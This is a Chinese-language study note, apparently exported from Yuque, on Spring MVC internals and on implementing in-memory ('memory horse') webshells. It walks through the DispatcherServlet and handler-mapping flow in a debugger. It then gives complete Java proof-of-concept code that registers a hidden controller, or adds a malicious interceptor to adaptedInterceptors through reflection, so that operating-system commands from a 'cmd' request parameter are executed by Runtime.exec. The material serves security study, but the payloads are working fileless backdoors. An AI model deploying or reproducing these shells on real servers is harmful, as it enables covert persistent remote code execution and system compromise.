# 前置知识
## bean
<font style="color:rgb(51, 51, 51);">bean是Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。</font>

<font style="color:rgb(133, 133, 133);">在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean。</font>

<font style="color:rgb(51, 51, 51);">通俗来讲：</font>

+ <font style="color:rgb(51, 51, 51);">bean 是对象</font>
+ <font style="color:rgb(51, 51, 51);">bean 被 IoC 容器管理</font>
+ <font style="color:rgb(51, 51, 51);">Spring 应用主要是由一个个的 bean 构成的</font>

application context 新建bean 相当于 new 了一个对象

service层

new application context对象 

getbeans 获得绑定的对象

调用方法

## 根context
#### <font style="color:rgb(51, 51, 51);">Root Context 和 Child Context</font>
+ <font style="color:rgb(51, 51, 51);">Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context</font>
+ <font style="color:rgb(51, 51, 51);">所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean</font>
+ <font style="color:rgb(51, 51, 51);">所有的Context在创建后，都会被作为一个属性添加到了 ServletContext 中</font>

#### <font style="color:rgb(51, 51, 51);">DispatcherServlet</font>
servlet 和 controller 的中间人 处理web请求 发送给controller和view 

`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">DispatcherServlet</font>`<font style="color:rgb(51, 51, 51);"> 从本质上来讲是一个 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Servlet</font>`<font style="color:rgb(51, 51, 51);">（扩展了 HttpServlet )。</font>

<font style="color:rgb(51, 51, 51);">从下面的继承关系图中可以发现： </font>`<font style="background-color:rgb(247, 247, 247);">DispatcherServlet</font>`<font style="color:rgb(51, 51, 51);"> 从本质上来讲是一个 </font>`<font style="background-color:rgb(247, 247, 247);">Servlet</font>`<font style="color:rgb(51, 51, 51);">（扩展了 HttpServlet )。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746757879736-83994fb2-8da1-44cd-898c-6e7f255646f7.png)



# Contoller内存马实现
这一块的重点在于Spring mvc 的处理流程 controller注册（添加恶意类和映射关系）



直接项目脚手架

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746761488135-923a8533-c6d2-4eb6-ab83-69d7cc9369d3.png)

新建一个spring项目

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746759616673-814e98b8-5269-4c62-93c3-a04cb6ee324e.png)![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746759660980-fcd0e0e6-a6b1-4d02-952f-96d16603fed0.png)

自动生成的启动类

```plain
package org.muscial.spring;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

}
```

伟大的cursor帮我解决了报错

端口改成8888

## Spring mvc tomcat和servlet
简单回顾下TCP和http

     HTTP协议是基于TCP协议的应用层协议，HTTP请求和响应都是通过TCP协议进行传输的。当客户端发起HTTP请求时，客户端与服务器之间会建立一个TCP连接，然后在该连接上进行HTTP数据的传输。在传输过程中，TCP协议会提供可靠性保证，如数据包的排序、重传等。因此，HTTP协议能够在不稳定的网络环境下保证数据传输的可靠性和完整性。

      <font style="background-color:#FBDE28;">  简单来说就是，TCP协议提供了可靠的传输服务，而HTTP协议则基于TCP协议，利用TCP协议提供的可靠性保证，实现了客户端和服务器之间的数据传输。因此，TCP和HTTP密切相关，常常一起使用。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746795793974-f3e43ab9-65e3-4632-bff9-564c588e2959.png)

简单的web服务器主要流程分为3块

接受浏览器请求 处理请求 响应请求

上面web服务器的流程中 有变化的只有逻辑处理器

那么我们可不可以把TCP->http解析这部分流程封装起来

<font style="color:rgb(82, 95, 127);">Tomcat就是这样一种服务器，它其实就是一个能够监听TCP连接请求，解析HTTP报文，将解析结果传给处理逻辑器、接收处理逻辑器的返回结果并通过TCP返回给浏览器的一个框架。在Tomcat各种组件中，Connnector就是负责网络通信的，而Container中的Servlet就是我们的逻辑处理器。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746796052994-2b13fa86-73e5-41c4-902f-744f4c1d7d6a.png)

## 调试分析 controll注册流程
写一个简单的controller

```plain
package org.muscial.spring.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class HelloController {

    @ResponseBody
    @RequestMapping("/hello")
    public String SayHello(){
        return "Hello!";
    }
}
```

```plain
mappedHandler = getHandler(processedRequest);
handler
mapping.getHandler(request);
mapping
RequestMappingHandlerMapping
RequestMappingHandlerMapping.getHandle
AbstractHandlerMapping有gethandler
赋值 this.mappingRegistry registry 方法
赋值中找 this.handlerMappings可以被上下文getbean出来
```

在sayhello上打上断点 分析controller是如何去注册然后映射到/hello路由上的

再调用sayhello方法

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746943559618-e8c99343-cc86-4410-b790-ef639aa2f5fa.png)

DispatcherServlet.java

mapped Handler 已经存有对应的controller handler bean，我们看是如何赋值的

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746943763871-5ac25f52-edd5-4818-8dc3-2424598ca365.png)

```plain
mappedHandler = getHandler(processedRequest);
```

再去看getHandler方法

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746943855251-e774aeec-84c0-4565-b9e2-704f0953dbd0.png)processedRequest 存的是当前的request信息 路由。。

再去看gethandler 方法

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944252574-7672727a-ca27-4240-9edd-af4350219917.png)

再所有的handler数组里面去遍历

返回的是<font style="color:#bcbec4;background-color:#1e1f22;">mapping.getHandler(request);</font>

<font style="color:#bcbec4;background-color:#1e1f22;">打个断点看是哪一个mapping</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944555965-b56dbe8f-3448-41c2-952c-48080bcbb0ff.png)

可以看到是![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944694218-edec7489-9770-452f-80e7-41e1dd26439b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944660836-b1aa1e93-df5a-4268-898d-a4da85fdd52d.png)

然后我们去找下这个RequestMappingHandlerMapping有没有getHandler方法

跳转到mapping类型源

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944800887-d3f4d742-5120-4e87-9225-954c0dcbf55c.png)

可以看到<font style="color:#bcbec4;background-color:#1e1f22;">RequestMappingHandlerMapping</font>没有getHandler方法

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746944857765-afa62983-e24a-40d5-a088-a2ca581e7498.png)

几个父类找下来 最后找到 <font style="color:#bcbec4;background-color:#1e1f22;">AbstractHandlerMapping有gethandler方法</font>

<font style="color:#bcbec4;background-color:#1e1f22;">继续调试</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945008003-f7d357a8-02ac-46e5-bc1f-e3739da0af58.png)

布进

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945187800-50076ffb-8913-4d0c-8dc5-9232e2c5c57a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945478300-f0dcc5a8-7331-4503-ba4e-b2e3d882201b.png)

返回<font style="color:#bcbec4;background-color:#1e1f22;">handlerMethod</font>

<font style="color:#bcbec4;background-color:#1e1f22;">我们看 handlerMethod 如何来 进入</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945547552-64b6e7f0-6297-48a3-ba21-d3f23b3d522d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945591626-20198a1c-d60d-46cd-9708-b2b043d50548.png)

可以看到<font style="color:#bcbec4;background-color:#1e1f22;">this.mappingRegistry </font>

<font style="color:#bcbec4;background-color:#1e1f22;">存有我们的映射关系</font>

<font style="color:#bcbec4;background-color:#1e1f22;">我们去找是如何赋值的</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945726238-c527e25a-8721-4f6f-b1a0-35687efdebb2.png)

然后找到他又一个注册方法

现在我们要取到<font style="color:#bcbec4;background-color:#1e1f22;">RequestMappingHandlerMapping这个子类</font>

然后去调用父类注册方法

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746945904670-95262333-1e5b-4582-a156-e8353fe4cf5e.png)

看this.handlerMappings是如何获取RequestMappingHandlerMapping的

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746946018635-34533321-910f-4fe7-8899-6b22ba9b2818.png)

赋值中找 this.handlerMappings可以被上下文getbean出来

先办法在controller中获得context

之前doservice方法里面有request的set方法 里面包含了context

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746946222840-9f644bb1-a3c5-4e54-9d80-7d658043b68c.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746946292192-11a196a0-ec3f-4fe8-b9e4-3bda201f5224.png)

## 写马
<font style="color:rgb(31, 35, 40);">接下来我们就要开始动手进行动态注入</font>`<font style="color:rgb(31, 35, 40);">Controller</font>`<font style="color:rgb(31, 35, 40);">的工作，通过前面的分析我们可以大致梳理出动态注册的流程：</font>

1. <font style="color:rgb(31, 35, 40);">获取上下文环境；</font>
2. <font style="color:rgb(31, 35, 40);">创建 Bean 实例并获取对应处理请求的 Method；</font>
3. <font style="color:rgb(31, 35, 40);">配置路径映射，通过</font>`<font style="color:rgb(31, 35, 40);">MappingRegistry#register()</font>`<font style="color:rgb(31, 35, 40);">方法添加进行注册</font>

WebApplicationContext获得的5种方式

**<font style="color:rgb(31, 35, 40);">getCurrentWebApplicationContext</font>**

<font style="color:rgb(31, 35, 40);">通过</font>`<font style="color:rgb(31, 35, 40);">getCurrentWebApplicationContext()</font>`<font style="color:rgb(31, 35, 40);">方法获取到的是一个</font>`<font style="color:rgb(31, 35, 40);">XmlWebApplicationContext</font>`<font style="color:rgb(31, 35, 40);">实例类型的</font>`<font style="color:rgb(31, 35, 40);">Root WebApplicationContext</font>`<font style="color:rgb(31, 35, 40);">。</font>

```plain
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

<font style="color:rgb(31, 35, 40);background-color:rgb(246, 248, 250);"></font>

**<font style="color:rgb(31, 35, 40);">WebApplicationContextUtils</font>**

<font style="color:rgb(31, 35, 40);">这里</font>`<font style="color:rgb(31, 35, 40);">WebApplicationContextUtils.getWebApplicationContext()</font>`<font style="color:rgb(31, 35, 40);">也可以替换成</font>`<font style="color:rgb(31, 35, 40);">WebApplicationContextUtils.getRequiredWebApplicationContext()</font>`

```plain
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

  
 **<font style="color:rgb(31, 35, 40);">RequestContextUtils</font>**

<font style="color:rgb(31, 35, 40);">通过</font>`<font style="color:rgb(31, 35, 40);">ServletRequest</font>`<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">类的实例来获得</font><font style="color:rgb(31, 35, 40);"> </font>`<font style="color:rgb(31, 35, 40);">Child WebApplicationContext</font>`<font style="color:rgb(31, 35, 40);">。</font>

```plain
WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

<font style="color:rgb(31, 35, 40);">函数原型为 </font>`<font style="color:rgb(31, 35, 40);">public static WebApplicationContext getWebApplicationContext(ServletRequest request)</font>`<font style="color:rgb(31, 35, 40);"> （spring 3.1 中</font>`<font style="color:rgb(31, 35, 40);">findWebApplicationContext</font>`<font style="color:rgb(31, 35, 40);">需要换成</font>`<font style="color:rgb(31, 35, 40);">getWebApplicationContext</font>`<font style="color:rgb(31, 35, 40);"> ）</font>  
 **<font style="color:rgb(31, 35, 40);">getAttribute</font>**

`<font style="color:rgb(31, 35, 40);">Context</font>`<font style="color:rgb(31, 35, 40);">在创建后，被作为一个属性添加到了</font>`<font style="color:rgb(31, 35, 40);">ServletContext</font>`<font style="color:rgb(31, 35, 40);">中，所以通过直接获得</font>`<font style="color:rgb(31, 35, 40);">ServletContext</font>`<font style="color:rgb(31, 35, 40);">类的属性</font>`<font style="color:rgb(31, 35, 40);">Context</font>`<font style="color:rgb(31, 35, 40);">拿到。</font>

```plain
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

<font style="color:rgb(31, 35, 40);">其中</font>`<font style="color:rgb(31, 35, 40);">currentRequestAttributes()</font>`<font style="color:rgb(31, 35, 40);">替换成</font>`<font style="color:rgb(31, 35, 40);">getRequestAttributes()</font>`<font style="color:rgb(31, 35, 40);">也同样有效；</font>`<font style="color:rgb(31, 35, 40);">getAttribute</font>`<font style="color:rgb(31, 35, 40);">参数中的 0 代表从当前 request 中获取而不是从当前的 session中 获取属性值。</font>

**<font style="color:rgb(31, 35, 40);">LiveBeansView</font>**

<font style="color:rgb(31, 35, 40);">因为</font>`<font style="color:rgb(31, 35, 40);">org.springframework.context.support.LiveBeansView</font>`<font style="color:rgb(31, 35, 40);">类在</font>`<font style="color:rgb(31, 35, 40);">spring-context 3.2.x </font>`<font style="color:rgb(31, 35, 40);">版本才加入其中，所以低版本无法通过此方法获得</font>`<font style="color:rgb(31, 35, 40);">ApplicationContext</font>`<font style="color:rgb(31, 35, 40);">的实例。</font>

<font style="color:rgb(31, 35, 40);">  
</font><font style="color:rgb(31, 35, 40);"> </font>![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746955723950-dc03fd3b-afea-4ffd-8229-720786d0b0d2.png)

下面是一些写法

// 反射调用 MappingRegistry 的 register 方法

```plain
package com.study.springdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * Created by dotast on 2022/11/25 16:37
 */
@Controller
public class HelloController {

    @ResponseBody
    @RequestMapping("/hello")
    public String SayHello(HttpServletRequest req, HttpServletResponse resp){
        String path = "/favicon";
        try{
            // 加载类
            HelloController helloController = new HelloController();
            Method evilMethod = HelloController.class.getMethod("evil", HttpServletRequest.class, HttpServletResponse.class);
            // 获取上下文环境
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 通过 context 获取 RequestMappingHandlerMapping 对象
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 获取父类的 MappingRegistry 属性
            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);
            //路径映射绑定
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            // springboot 2.6.x之后的版本需要pathPatternsCondition
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();

            // 反射调用 MappingRegistry 的 register 方法
            Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] methods = c.getDeclaredMethods();
            for (Method method:methods){
                if("register".equals(method.getName())){
                    // 反射调用 MappingRegistry 的 register 方法注册
                    method.setAccessible(true);
                    method.invoke(mappingRegistry,requestMappingInfo,helloController,evilMethod);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return "Hello!";
    }

    public void evil(HttpServletRequest request, HttpServletResponse response) throws Exception{
        try{
            String cmd = request.getParameter("cmd");
            if(cmd != null){
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                ByteArrayOutputStream bao = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a = -1;
                while((a = inputStream.read(bytes))!=-1){
                    bao.write(bytes,0,a);
                }
                response.getWriter().write(new String(bao.toByteArray()));
            }else {
                response.sendError(404);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

registerMapping注册

```plain
package org.muscial.spring.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class shell_controller {

    //    @ResponseBody
    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```



# interceptor内存马
<font style="color:rgb(31, 35, 40);">Interceptor 内存马比之 Controller 内存马 更具有实战意义，在实际环境中，常常会遇到无论我们访问什么路由，都会因为没有登录而被拦截器跳转到</font>`<font style="color:rgb(31, 35, 40);">/login</font>`<font style="color:rgb(31, 35, 40);">路由的情况。</font>

<font style="color:rgb(31, 35, 40);">定义</font>`<font style="color:rgb(31, 35, 40);">Interceptor</font>`<font style="color:rgb(31, 35, 40);">大致有两种方式：</font>

+ <font style="color:rgb(31, 35, 40);">实现</font>`<font style="color:rgb(31, 35, 40);">HandlerInterceptor</font>`<font style="color:rgb(31, 35, 40);">接口或者继承</font>`<font style="color:rgb(31, 35, 40);">HandlerInterceptor</font>`<font style="color:rgb(31, 35, 40);">接口的实现类；</font>
+ <font style="color:rgb(31, 35, 40);">实现</font>`<font style="color:rgb(31, 35, 40);">WebRequestInterceptor</font>`<font style="color:rgb(31, 35, 40);">接口或者继承</font>`<font style="color:rgb(31, 35, 40);">WebRequestInterceptor</font>`<font style="color:rgb(31, 35, 40);">接口的实现类</font>



<font style="color:rgb(31, 35, 40);"></font>`<font style="color:rgb(31, 35, 40);">HandlerInterceptor</font>`<font style="color:rgb(31, 35, 40);">类一共有三个方法，作用分别为：</font>

+ `<font style="color:rgb(31, 35, 40);">preHandle()</font>`<font style="color:rgb(31, 35, 40);">：在 Controller 处理请求之前执行，返回</font>`<font style="color:rgb(31, 35, 40);">true</font>`<font style="color:rgb(31, 35, 40);">为放行，执行下一个拦截器，如果没有拦截器就执行 Controller 方法；返回</font>`<font style="color:rgb(31, 35, 40);">false</font>`<font style="color:rgb(31, 35, 40);">为不放行，不会执行 Controller 方法。</font>
+ `<font style="color:rgb(31, 35, 40);">postHandle()</font>`<font style="color:rgb(31, 35, 40);">：在 Controller 处理请求之后、解析视图（例如 JSP）之前执行，如果拦截器定义了跳转的页面，则不会跳转 Controller 方法指定的页面。</font>
+ `<font style="color:rgb(31, 35, 40);">afterCompletion()</font>`<font style="color:rgb(31, 35, 40);">：在 Controller 处理请求之后、解析视图之后执行，该方法可以完成一些处理日志之类的任务。</font>

代码抄了下别人的

controller

```plain
package org.muscial.spring.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class LoginController{
    @ResponseBody
    @RequestMapping("/login")
    public String Login(){
        return "Success";
    }

}
```

配置

```plain
package org.muscial.spring.demos.web;

import org.muscial.spring.demos.web.HelloController;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;


@Configuration
public class InterceptorConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        //addPathPatterns用于添加拦截路径
        //excludePathPatterns用于添加不拦截的路径
        registry.addInterceptor(new HelloInterceptor()).addPathPatterns("/*").excludePathPatterns("");
    }
}
```

interceptor

```plain
package org.muscial.spring.demos.web;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class HelloInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{
        System.out.println("SpringInterceptor init...");
        String url = request.getRequestURI();
        if (url.indexOf("/login") >=0){
            response.getWriter().write("Login page");
            response.getWriter().flush();
            response.getWriter().close();
            return true;
        }
        response.getWriter().write("Please login first");
        response.getWriter().flush();
        response.getWriter().close();
        return false;
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746970883594-ec891930-0891-4308-a482-de518bc7a5bb.png)

## 跟进流程复现
![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746971070914-52cc80b8-1d45-414c-9a9c-d8c4e2a32bde.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746971306888-d832e742-4218-45ef-ac93-b1fe18cb7232.png)

dodispatch 这一步 mappedHandler 已经获取到了我们注册的interceptor

打上断点再看看mappedHandler

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746971780225-eca35607-e25c-44d9-b009-be15caf131c2.png)

一路跟到

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746972050289-2b65a14a-5d16-4232-ae01-0155c54a968f.png)

<font style="color:#bcbec4;background-color:#1e1f22;">getHandlerExecutionChain</font>

有添加拦截器的操作

需要把自己写的拦截器添加进<font style="color:#bcbec4;background-color:#1e1f22;">this.adaptedInterceptors</font>

添加到这个list里面就好

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1746972692546-1e4075aa-8f92-4d09-94c9-46aad5e550cf.png)adaptedInterceptors可以通过反射拿到

<font style="color:rgb(31, 35, 40);">可以看到最后遍历调用</font>`<font style="color:rgb(31, 35, 40);">Interceptor</font>`<font style="color:rgb(31, 35, 40);">的</font>`<font style="color:rgb(31, 35, 40);">preHandle()</font>`<font style="color:rgb(31, 35, 40);">拦截方法，根据前面的调用链，我们可以简单总结一次请求到应用层的步骤为：</font>

```plain
HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Controller
```

poc

```plain
package org.muscial.spring.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class Inject_Shell_Interceptor_Controller {

    @ResponseBody
    @RequestMapping("/inject")
    public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        //获取上下文环境
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

        //获取adaptedInterceptors属性值
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);


        //将恶意Interceptor添加入adaptedInterceptors
        Shell_Interceptor shell_interceptor = new Shell_Interceptor();
        adaptedInterceptors.add(shell_interceptor);
    }

    public class Shell_Interceptor implements HandlerInterceptor{
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
                return true;
            }
            return false;
        }
    }
}
```



# 参考
[https://github.com/dota-st/JavaSec/blob/master/05-%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%93%E5%8C%BA/5-Spring%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BInterceptor/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC.md](https://github.com/dota-st/JavaSec/blob/master/05-%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%93%E5%8C%BA/5-Spring%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BInterceptor/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC.md)

[https://goodapple.top/archives/1355](https://goodapple.top/archives/1355)

